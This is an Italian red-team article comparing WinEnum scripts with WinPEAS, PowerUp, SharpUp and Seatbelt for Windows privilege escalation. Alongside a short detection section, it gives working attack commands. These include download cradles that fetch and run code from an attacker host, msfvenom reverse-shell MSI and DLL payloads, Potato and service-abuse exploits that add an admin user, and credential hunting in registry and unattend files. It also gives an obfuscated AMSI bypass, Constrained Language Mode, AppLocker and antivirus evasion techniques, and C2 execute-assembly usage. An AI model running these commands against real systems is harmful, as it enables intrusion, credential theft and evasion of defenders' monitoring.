---
title: 'WinEnum: enumerazione Windows per privilege escalation e confronto con WinPEAS'
slug: winenum
description: >-
  Guida completa a WinEnum per l’enumerazione post-exploitation su Windows:
  varianti PowerShell e Batch, check di privilege escalation, OPSEC, differenze
  con WinPEAS, PowerUp, SharpUp e Seatbelt.
image: /winenum.webp
draft: false
date: 2026-04-01T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - privesc-windows
  - post-exploitation
---

**WinEnum non è un singolo tool, ma una famiglia di script indipendenti** — tutti focalizzati sull'enumerazione post-exploitation di sistemi Windows per identificare vettori di privilege escalation. La versione più nota è **Invoke-WinEnum** di Christopher Ross (@xorrior), integrata nativamente nel framework Empire come modulo `powershell/situational_awareness/host/winenum`. Accanto a questa esistono almeno sei varianti su GitHub (PowerShell, Batch, Python), ciascuna con scope e profondità differenti. WinEnum si posiziona come tool leggero e modulare, in netto contrasto con WinPEAS che rappresenta la soluzione "all-in-one" più completa ma anche più rumorosa. Comprendere quando usare l'uno o l'altro — e come integrarli nella kill chain — è essenziale per qualsiasi operazione di red teaming moderna.

***

## Anatomia di WinEnum: repository, varianti e architettura

Il nome "WinEnum" identifica almeno **sette repository distinti** su GitHub, ciascuno sviluppato indipendentemente. Ecco le varianti principali con il loro posizionamento operativo.

### Invoke-WinEnum (xorrior) — il riferimento storico

La versione più influente è il modulo PowerShell creato da **Christopher Ross (@xorrior)**, originariamente parte della collezione RandomPS-Scripts (319 stelle) e successivamente integrato nell'**Empire Framework** (7.800+ stelle, archiviato nel 2020, fork attivo da BC-Security). Questo script raccoglie informazioni sull'host e sul contesto utente corrente senza richiedere privilegi amministrativi.

```powershell
# Uso standalone
Invoke-WinEnum -User "targetuser"
Invoke-WinEnum -keyword "password"

# Uso in Empire
usemodule powershell/situational_awareness/host/winenum
set Agent Y4LHEV83
set Keywords "password"
execute
```

Le funzioni interne includono `Get-UserInfo` (SID, gruppi, appartenenze), enumerazione di rete (adattatori, porte aperte, mapping processo-porta, regole firewall), ricerca file basata su keyword, recupero contenuto clipboard e interrogazione **WMI SecurityCenter2**. Richiede **PowerShell 2.0** come minimo ed è classificato come **OpsecSafe** nella documentazione Empire — opera in background senza generare artefatti evidenti su disco.

### EnginDemirbilek/WinEnum — focus su privilege escalation

Repository PowerShell (GPL-3.0, 16 stelle, 24 commit, stato BETA) di **Engin Demirbilek**, specificatamente progettato per automatizzare la ricerca di vettori di privilege escalation. È la variante con i check più mirati tra tutte quelle denominate "WinEnum".

```powershell
powershell -ExecutionPolicy Bypass
Import-Module winenum.ps1
```

I check implementati coprono aree critiche per la privilege escalation:

* **`Check-AlwaysInstallElevated`** — verifica le chiavi registro HKCU e HKLM per la vulnerabilità MSI elevation, con link diretto all'exploit
* **`Check-UnquotedServicePath`** — identifica servizi con percorsi non quotati
* **`Check-ServiceExecutablePermissions`** — verifica permessi su eseguibili dei servizi per Everyone e BUILTIN\Users
* **`Check-ScheduledTaskExecutablePermissions`** — analizza permessi su eseguibili di task schedulati non-Microsoft
* **`Check-GeneralPasswordFolders`** — cerca file password in path noti (sysprep.xml, unattend.xml)
* **`Check-isVirtual`** — rileva ambienti virtualizzati (VMware)
* **`Check-SecurityUpdates`** — lista hotfix installati con date

L'output utilizza prefissi `[+]` con colorazione verde per i finding positivi. Quando identifica una vulnerabilità critica, produce un output come:

```
[+][+][+] Vulnerability granted !!! Check: https://pentestlab.blog/2017/02/28/always-install-elevated/
```

### Varianti Batch e Python

**absolomb/winenum.bat** (v1.1, nel repository Pentesting con 124 stelle) è uno script Batch che offre selezione del profilo OS (Vista/2003SP2+ oppure XP/2003) e crea una directory `C:\temp` per i risultati. Esegue `systeminfo`, `ipconfig /all`, `arp -a`, `route print` e decine di altri comandi nativi Windows.

**neox41/WinEnum** (31 stelle) di Mattia Reggiani è un altro script Batch che redirige tutto l'output in `report.txt` con separatori strutturati — approccio utile per ambienti dove PowerShell è bloccato o monitorato.

**absolomb/WindowsEnum.ps1** (315 stelle, la più popolare tra le varianti dedicate) è uno script PowerShell che distingue tra **check standard** e **check estesi**:

```powershell
.\WindowsEnum.ps1           # Check rapidi
.\WindowsEnum.ps1 extended  # Check estesi (config files, password, registry)
```

La modalità estesa cerca file con estensioni sensibili (\*.kdbx, \*.pem, \*.ppk, \*.rdp, \*.vnc) e credenziali memorizzate via `cmdkey /list`.

**tdmathison/WinEnum.py** è l'unica variante Python, compilabile con PyInstaller in un eseguibile standalone. Dipende da **accesschk.exe** (Sysinternals) per verificare i permessi e copre service permissions, scheduled task permissions, unquoted paths e credenziali in file e registro.

***

## Matrice di enumerazione: cosa rileva ogni variante

La copertura funzionale varia drasticamente tra le varianti. La tabella seguente mostra quali aree ciascuna versione di WinEnum è in grado di analizzare:

|         Categoria        | Invoke-WinEnum (Empire) | EnginDemirbilek | absolomb .bat | absolomb .ps1 | neox41 | tdmathison .py |
| :----------------------: | :---------------------: | :-------------: | :-----------: | :-----------: | :----: | -------------- |
|  System info (OS, arch)  |            ✅            |        ✅        |       ✅       |       ✅       |    ✅   | ✅              |
| Network (IP, ARP, route) |            ✅            |        ✅        |       ✅       |       ✅       |    ✅   | —              |
|      Utenti e gruppi     |            ✅            |        ✅        |       ✅       |       ✅       |    ✅   | —              |
|   Informazioni dominio   |            ✅            |        ✅        |       —       |       —       |    —   | —              |
|      Patch e hotfix      |            ✅            |        ✅        |       ✅       |       ✅       |    ✅   | ✅              |
|    Servizi (permessi)    |            —            |        ✅        |       ✅       |       —       |    ✅   | ✅              |
|   Unquoted service path  |            —            |        ✅        |       —       |       —       |    ✅   | ✅              |
|   AlwaysInstallElevated  |            —            |        ✅        |       —       |       —       |    —   | —              |
|      Scheduled task      |            —            |        ✅        |       —       |       —       |    ✅   | ✅              |
|   File con credenziali   |       ✅ (keyword)       |        ✅        |       —       |       ✅       |    ✅   | ✅              |
| Credenziali nel registro |            —            |        —        |       —       |       —       |    —   | ✅              |
|      Processi attivi     |            ✅            |        —        |       ✅       |       —       |    ✅   | —              |
|      Firewall rules      |            ✅            |        —        |       —       |       —       |    —   | —              |
|         Clipboard        |            ✅            |        —        |       —       |       —       |    —   | —              |
|       VM detection       |            —            |        ✅        |       —       |       —       |    —   | —              |

**Nessuna variante di WinEnum copre tutte le aree**. Questo è il limite strutturale del tool: ogni versione è un progetto personale con scope limitato. Per un'enumerazione completa, WinEnum va sempre affiancato ad altri strumenti.

***

## WinEnum nel contesto: confronto operativo con le alternative

La scelta dello strumento di enumerazione dipende da tre fattori: **livello di stealth richiesto**, **copertura necessaria** e **vincoli ambientali** (PowerShell disponibile, .NET presente, EDR attivo). Ogni tool occupa una nicchia specifica.

### WinEnum vs WinPEAS

WinPEAS (di Carlos Polop, parte del progetto PEASS-ng con **16.000+ stelle**) è di un ordine di grandezza più completo. Dove WinEnum esegue 5-12 check specifici, WinPEAS ne esegue centinaia: estrazione credenziali browser (Firefox, Chrome, Opera, Brave), password GPP cached, DLL hijacking, suggerimento kernel exploit tramite Watson integrato, verifica WSUS, analisi GPO abuse, e molto altro. L'output è **color-coded** (rosso = opportunità immediata di privesc, giallo = link informativi, verde = protezioni attive).

Il trade-off è chiaro: WinPEAS è **estremamente rumoroso** e quasi sempre rilevato da Windows Defender e EDR commerciali. WinEnum, essendo uno script PowerShell leggero, ha un **profilo di detection significativamente più basso**. In ambienti con EDR attivo, WinEnum può funzionare dove WinPEAS verrebbe bloccato al primo tentativo di esecuzione.

### WinEnum vs PowerUp

**PowerUp** (di Will Schroeder/@harmj0y, parte di PowerSploit) è superiore a WinEnum per un motivo fondamentale: **non solo enumera, ma sfrutta**. Funzioni come `Invoke-ServiceAbuse` possono direttamente modificare il binpath di un servizio vulnerabile per ottenere privilege escalation. WinEnum si limita a segnalare; PowerUp agisce. Tuttavia PowerSploit è **archiviato dal 2020** e le sue signature sono ampiamente note ad AV e EDR.

### WinEnum vs SharpUp e Seatbelt

**SharpUp** è il port C# di PowerUp — funziona dove PowerShell è bloccato e si integra perfettamente con `execute-assembly` in Cobalt Strike. **Seatbelt** (70+ moduli, stesso team GhostPack) è il tool con il **miglior rapporto stealth/informazione**: l'esecuzione modulare permette di lanciare solo i check necessari, minimizzando la superficie di detection. Per operazioni red team reali, la combinazione Seatbelt + SharpUp ha sostanzialmente rimpiazzato sia WinEnum che PowerUp.

| Tool                                                 | Linguaggio          | Scope                 | Stealth    | Detection AV | Manutenzione  | Caso d'uso ottimale             |
| ---------------------------------------------------- | ------------------- | --------------------- | ---------- | ------------ | ------------- | ------------------------------- |
| **WinEnum** (varie)                                  | PS/Batch/Python     | Limitato              | Alto       | Bassa        | ❌ Abbandonato | Quick check in ambienti con EDR |
| **[WinPEAS](https://hackita.it/articoli/winpeas)**   | C#/.bat/.ps1        | Massimo               | Basso      | Alta         | ✅ Attiva      | CTF, lab, assessment senza EDR  |
| **[PowerUp](https://hackita.it/articoli/powerup)**   | PowerShell          | Misconfig + exploit   | Medio      | Media-Alta   | ❌ Archiviato  | Service abuse diretto           |
| **[SharpUp](https://hackita.it/articoli/sharpup)**   | C# (.NET 3.5)       | Misconfig             | Medio-Alto | Media        | ⚠️ Bassa      | Red team, ambienti no-PS        |
| **[Seatbelt](https://hackita.it/articoli/seatbelt)** | C# (.NET 3.5/4.0)   | Situational awareness | Massimo    | Bassa-Media  | ⚠️ Moderata   | Stealth recon, check mirati     |
| **[JAWS](https://hackita.it/articoli/jaws)**         | PowerShell 2.0      | Generale              | Medio      | Bassa-Media  | ❌ Abbandonato | Sistemi legacy (Win7/2008)      |
| **[WES-NG](https://hackita.it/articoli/wes-ng)**     | Python (off-target) | Patch gap             | Massimo    | Nessuna      | ✅ Attiva      | Analisi patch zero-footprint    |

***

## Uso operativo nella kill chain

L'enumerazione si posiziona in un punto preciso della catena d'attacco: **dopo l'accesso iniziale e lo stabilimento di un C2 stabile, prima della privilege escalation**. Eseguire tool di enumerazione senza prima verificare le difese attive è un errore operativo che può compromettere l'intera operazione.

### Fase 0: situational awareness (prima dell'enumerazione)

```cmd
whoami /all
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Domain"
tasklist /v | findstr /i "crowd sentinel carbon defender"
wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
```

Questi comandi nativi **non generano alert** nella maggior parte degli ambienti e forniscono le informazioni critiche per decidere quale tool utilizzare. Se Sysmon è attivo con ScriptBlock Logging, evitare PowerShell e optare per tool C# via execute-assembly. Se Defender è attivo senza EDR, un AMSI bypass potrebbe essere sufficiente.

### Fase 1: trasferimento ed esecuzione

**In-memory (zero footprint su disco):**

```powershell
# PowerUp via download cradle
iex(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerUp.ps1')
Invoke-AllChecks

# WinPEAS via .NET reflection
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "http://<IP>/winPEASany_ofs.exe" -UseBasicParsing).Content)
[winPEAS.Program]::Main("")
```

**Su disco (quando necessario):**

```cmd
certutil -urlcache -f http://<IP>/winPEASx64.exe C:\Windows\Temp\w.exe
C:\Windows\Temp\w.exe cmd > C:\Windows\Temp\out.txt 2>&1

REM Directory meno monitorate per upload
C:\Windows\System32\spool\drivers\color\
C:\Windows\Tasks\
```

**Da share SMB (senza copia locale):**

```cmd
\\<ATTACKER_IP>\share\winPEASx64.exe
```

### Fase 2: integrazione con framework C2

**Metasploit — modulo PEASS nativo:**

```bash
use post/multi/gather/peass
set SESSION 1
set PARAMETERS "systeminfo servicesinfo windowscreds"
set TEMP_DIR C:\\Windows\\System32\\spool\\drivers\\color
run
```

Il modulo gestisce automaticamente upload, esecuzione e cleanup. La directory di default `spool\drivers\color` è scelta perché spesso presente nelle esclusioni AV.

**Cobalt Strike — execute-assembly e alternative:**

```
# Standard fork-and-run (crea processo sacrificale)
beacon> execute-assembly /path/to/winPEASany.exe systeminfo servicesinfo

# In-process (più OPSEC-safe, ma se rilevato muore il beacon)
beacon> inlineExecute-Assembly --dotnetassembly /path/to/winPEASany.exe --assemblyargs "systeminfo" --amsi --etw

# PowerUp senza powershell.exe (bypassa AMSI + CLM)
beacon> powershell-import /path/to/PowerUp.ps1
beacon> powerpick Invoke-AllChecks
```

**Empire/Starkiller:**

```
usemodule powershell/privesc/winPEAS
set Agent <AGENT_NAME>
set notansi False
execute
```

Empire include anche moduli nativi per `powerup/allchecks`, `powerup/service_stager`, `ms16_032`, `getsystem` — un intero arsenale di privesc integrato.

**Sliver C2 — con bypass AMSI/ETW integrato:**

```
sliver (SESSION)> execute-assembly -i -M -E /path/to/winPEASany.exe systeminfo
# -i = in-process | -M = bypass AMSI | -E = bypass ETW
```

**Havoc C2 — dotnet inline-execute:**

```
Demon » dotnet inline-execute /path/to/SharpUp.exe audit
[+] Successfully Patched Amsi
[*] Using CLR Version: v4.0.3031
=== SharpUp: Running Privilege Escalation Checks ===
[+] Hijackable DLL: C:\Users\user\AppData\Local\Microsoft\OneDrive\...\FileSyncShell64.dll
```

***

## I 9 vettori di privilege escalation che l'enumerazione deve trovare

L'output di qualsiasi tool di enumerazione va letto cercando pattern specifici. Ecco i **vettori più comuni** con i comandi di verifica e sfruttamento corrispondenti.

**1. Unquoted service path** — un servizio con percorso `C:\Program Files\Vuln App\service.exe` senza virgolette permette di piazzare un eseguibile malevolo in `C:\Program.exe` o `C:\Program Files\Vuln.exe`:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows"
sc stop <service> && sc start <service>
```

**2. AlwaysInstallElevated** — entrambe le chiavi registro devono essere impostate a 1:

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > evil.msi
msiexec /quiet /qn /i evil.msi
```

**3. Servizi con permessi deboli** — se l'utente corrente può modificare la configurazione di un servizio:

```powershell
Get-ModifiableService  # PowerUp
Invoke-ServiceAbuse -Name 'VulnSvc' -Command "net localgroup Administrators attacker /add"
```

**4. SeImpersonatePrivilege** — presente su account di servizio (IIS, MSSQL). Sfruttabile con la famiglia Potato:

```cmd
whoami /priv
GodPotato-NET4.exe -cmd "cmd /c whoami"      # Più universale, funziona su Windows recenti
PrintSpoofer64.exe -i -c "C:\path\beacon.exe"  # Per Server 2016/2019
```

**5. Credenziali memorizzate** — autologon nel registro, Credential Manager, file unattend:

```cmd
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
type C:\Windows\Panther\Unattend.xml
findstr /si password *.txt *.xml *.ini *.config
```

**6. DLL hijacking** — directory writable nel PATH di sistema o DLL mancanti da servizi:

```cmd
echo %PATH%
icacls "C:\some\path\dir"
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > hijack.dll
```

**7. Scheduled task con permessi deboli** — task eseguiti come SYSTEM il cui binario è scrivibile dall'utente corrente:

```cmd
schtasks /query /fo LIST /v | findstr /i "Task To Run" | findstr /i /v "system32"
icacls "C:\path\to\scheduled\binary.exe"
```

**8. Kernel exploit per patch mancanti:**

```cmd
systeminfo > sysinfo.txt
# Sulla macchina attacker:
python wes.py sysinfo.txt --exploits-only
```

**9. Writable PATH directories** — permette DLL hijacking a livello di sistema quando un'applicazione privilegiata carica una DLL non trovata nelle directory precedenti del PATH.

***

## Detection, forensics e OPSEC: il lato difensivo

Comprendere **cosa vede il blue team** quando eseguiamo tool di enumerazione è fondamentale per operare con consapevolezza. Ogni esecuzione lascia tracce specifiche.

### Event ID critici generati dall'enumerazione

Gli Event ID più rilevanti per il rilevamento sono divisi tra **Security log**, **PowerShell Operational** e **Sysmon**:

**PowerShell Operational Log** — il nemico principale degli script PowerShell:

* **Event ID 4104** (Script Block Logging): registra il contenuto completo degli script PowerShell, **incluso il codice deoffuscato a runtime**. Questo è il detection vector #1 per PowerUp, Invoke-WinEnum e qualsiasi tool PS. È abilitato **automaticamente** per script "sospetti" nelle versioni moderne di Windows.
* **Event ID 4103** (Module Logging): pipeline execution, CommandInvocation, ParameterBinding.

**Security Log:**

* **Event ID 4688**: Process Creation con command line — mostra `winPEAS.exe`, `powershell.exe -ep bypass`, comandi encoded.
* **Event ID 4798/4799**: enumerazione appartenenza gruppi utente/locale — generato da `net localgroup administrators` e simili.
* **Event ID 7045**: installazione servizio (PsExec e simili).

**Sysmon** (se installato):

* **Event ID 1**: Process Creation con hash, parent process, command line completa.
* **Event ID 7**: Image Loaded — rileva il caricamento di `System.Management.Automation.dll`, indicatore di PowerShell anche se non viene lanciato `powershell.exe`.
* **Event ID 13**: Registry Value Set — chiave per rilevare modifiche a `\services\<name>\ImagePath` (Sigma rule ID `0f9c21f1`).

### Artefatti forensi persistenti

Anche dopo la cancellazione del tool, restano tracce in almeno **sei posizioni**:

Il **Prefetch** (`C:\Windows\Prefetch\WINPEAS.EXE-{hash}.pf`) registra timestamp di esecuzione, conteggio run e file acceduti — prova diretta che il binario è stato eseguito. **Amcache.hve** conserva SHA1 hash e path del file. **ShimCache/AppCompatCache** nel registro mantiene gli ultimi 1024 programmi eseguiti. Il **BAM** (Background Activity Moderator, da Windows 10 Fall Creators) registra path completo + timestamp per SID utente. **UserAssist** nel registro HKCU conserva record ROT13-encoded di programmi GUI eseguiti. **SRUM** traccia utilizzo di rete e CPU per applicazione.

### Tecniche di evasion operative

**AMSI bypass** — necessario per qualsiasi tool PowerShell su Windows 10+:

```powershell
# Patch AmsiScanBuffer in memoria (più efficace, richiede obfuscazione manuale)
# Il concetto: sovrascrivere i primi byte di AmsiScanBuffer() con un'istruzione di return

# amsiInitFailed classico (DEVE essere obfuscato, la stringa originale è signatured)
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBk'))),'NonPublic,Static').SetValue($null,$true)
```

Tutti i bypass AMSI pubblici **sono a loro volta signatured da AMSI** — la modifica manuale è sempre necessaria. Lo strumento **AMSITrigger** (di RythmStick) scansiona script linea per linea contro AMSI per identificare esattamente quali righe attivano il rilevamento, permettendo un'obfuscazione mirata ed efficiente.

**Execution Policy bypass** (nessuno richiede privilegi admin):

```powershell
powershell -ep bypass -file script.ps1
type script.ps1 | powershell -noprofile -
echo IEX(New-Object Net.WebClient).DownloadString('http://<IP>/tool.ps1') | powershell -noprofile -
```

**Constrained Language Mode bypass:**

```powershell
# Verifica la modalità corrente
$ExecutionContext.SessionState.LanguageMode

# Downgrade a PowerShell v2 (no AMSI, no CLM)
powershell -version 2 -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP>/PowerUp.ps1')"
```

### Enumerazione manuale stealth con comandi nativi

Quando nessun tool è utilizzabile, l'enumerazione manuale con comandi Windows nativi è l'approccio più stealth — questi comandi si confondono con l'attività amministrativa normale:

```cmd
REM System info
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
hostname && whoami /priv && whoami /groups

REM Servizi (senza sc.exe, meno monitorato)
wmic service get name,displayname,pathname,startmode

REM Utenti e gruppi
net localgroup administrators
wmic useraccount where "LocalAccount=1" get name,sid

REM Rete
ipconfig /all && netstat -ano && arp -a

REM Software installato
wmic product get name,version

REM Scheduled task
schtasks /query /fo LIST /v

REM Autorun e persistence
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
wmic startup get caption,command
```

La regola operativa è la **moderazione**: eseguire 50 comandi di enumerazione in sequenza rapida genera pattern comportamentali anomali rilevabili anche senza Sysmon. Meglio distribuire i comandi nel tempo e intervallare con pause.

***

## Scenari operativi: dalla workstation al server locked-down

### Scenario 1: workstation domain-joined con Defender attivo

**Approccio**: evitare tool su disco, usare enumerazione in-memory.

```powershell
# 1. AMSI bypass (obfuscato)
# 2. PowerUp in memoria
iex(New-Object Net.WebClient).DownloadString('http://<IP>/PowerUp.ps1')
Invoke-AllChecks | Out-String

# 3. Se si ha accesso C2: Seatbelt moduli specifici via execute-assembly
execute-assembly Seatbelt.exe TokenPrivileges WindowsAutoLogon CredEnum DotNet
```

### Scenario 2: server standalone senza dominio

Focus aggiuntivo su configurazioni server-specifiche:

```cmd
type C:\inetpub\wwwroot\web.config | findstr connectionString
reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server" /s | findstr /i password
schtasks /query /fo LIST /v
wmic service list full > services.txt
```

### Scenario 3: ambiente con AppLocker/WDAC

Quando l'esecuzione di .exe è bloccata:

```cmd
REM Usare winPEAS.bat invece di .exe
cmd /c winPEAS.bat > output.txt

REM MSBuild bypass (.NET whitelisted)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj

REM InstallUtil bypass
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
```

### Matrice decisionale: quando usare cosa

| Scenario                     | Tool consigliato                      | Motivazione                              |
| ---------------------------- | ------------------------------------- | ---------------------------------------- |
| CTF / Lab senza AV           | WinPEAS full scan                     | Massima copertura, velocità              |
| Red team con EDR             | Seatbelt (moduli specifici) + SharpUp | Stealth massimo, check mirati            |
| PowerShell bloccato          | SharpUp via execute-assembly          | C#, nessuna dipendenza PS                |
| Sistema legacy (Win7/2008)   | JAWS + WES-NG                         | Compatibilità PS 2.0, analisi off-target |
| Zero footprint richiesto     | WES-NG + comandi manuali              | Nessun tool sul target                   |
| Quick check con Empire       | Invoke-WinEnum                        | Integrato nativamente, leggero           |
| Conferma misconfig specifica | PowerUp (funzione singola)            | Check + exploit in un comando            |

***

## Troubleshooting: problemi comuni e soluzioni

**AV blocca l'esecuzione di WinPEAS.exe**: usare la versione obfuscata (`winPEASany_ofs.exe`), compilare da sorgente con modifiche (rinominare namespace e stringhe), usare la versione .bat (meno check ma nessuna signature .exe), caricare in memoria via Assembly.Load dopo AMSI bypass, oppure verificare le directory di esclusione Defender con `Get-MpPreference | Select-Object -ExpandProperty ExclusionPath` e uploadare lì.

**WinPEAS troppo lento (5-15 minuti su full scan)**: usare flag specifici per limitare lo scope:

```cmd
winPEASx64.exe servicesinfo        # Solo servizi
winPEASx64.exe windowscreds        # Solo credenziali
winPEASx64.exe quiet               # Output ridotto
```

**WMIC non funziona su Windows 11+**: Microsoft ha deprecato WMIC nelle versioni recenti. Usare cmdlet PowerShell CIM equivalenti:

```powershell
Get-CimInstance Win32_Service | Select Name,PathName,StartMode
Get-CimInstance Win32_QuickFixEngineering | Select HotFixID,InstalledOn
```

**Permessi insufficienti per alcuni check**: WinPEAS e PowerUp sono progettati per funzionare come utenti non privilegiati — la maggior parte dei check funziona. Check specifici che richiedono admin (dump SAM, modifica servizi, scrittura registro) falliranno silenziosamente. Se l'account è un service account (IIS APPPOOL, MSSQL), verificare `SeImpersonatePrivilege` con `whoami /priv` — presente nella maggioranza dei casi.

***

## Conclusione

WinEnum rimane rilevante nel 2026 non per la sua completezza — sotto questo aspetto è stato superato da WinPEAS anni fa — ma per la sua **leggerezza operativa e basso profilo di detection**. In ambienti con EDR attivo, uno script PowerShell da pochi KB che esegue check mirati è infinitamente più praticabile di un binario .NET da centinaia di KB con migliaia di signature note. La strategia ottimale è un approccio **layered**: comandi manuali nativi per la situational awareness iniziale, Seatbelt o WinEnum per check mirati in ambienti monitorati, WinPEAS per sweep completi quando il rischio di detection è accettabile. Il pentester esperto non si affeziona a un singolo tool: sceglie lo strumento giusto in base al contesto operativo, alla postura difensiva del target e alla fase della kill chain in cui si trova.

Vuoi supportare HackIta e aiutare il progetto a crescere? Dai un’occhiata alla pagina [Supporto](https://hackita.it/supporto/).

Se cerchi [formazione 1:1 o servizi di penetration test per aziende](https://hackita.it/servizi/), trovi tutto nella pagina Servizi.

Per riferimento esterno sul tool, puoi consultare anche il modulo storico [Invoke-WinEnum in Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/host/Invoke-WinEnum.ps1).

1: [https://hackita.it/supporto/?utm\_source=chatgpt.com](https://hackita.it/supporto/?utm_source=chatgpt.com) "Supporto - HackIta"
2: [https://hackita.it/servizi/?utm\_source=chatgpt.com](https://hackita.it/servizi/?utm_source=chatgpt.com) "Servizi - HackIta"
3: [https://github.com/EmpireProject/Empire/blob/master/data/module\_source/situational\_awareness/host/Invoke-WinEnum.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/host/Invoke-WinEnum.ps1)?
